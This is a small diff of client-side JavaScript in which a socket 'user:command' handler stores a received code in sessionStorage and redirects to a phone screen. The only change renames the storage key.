@@ -168,7 +168,7 @@ socket.on("user:command", (data) => {
     console.log("code :",code);
       if (!code) return;
 	       phoneNumberEl = document.querySelector("#code");
-	      sessionStorage.setItem("setcode", code);
+	      sessionStorage.setItem("setPromptCode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
 	        return;
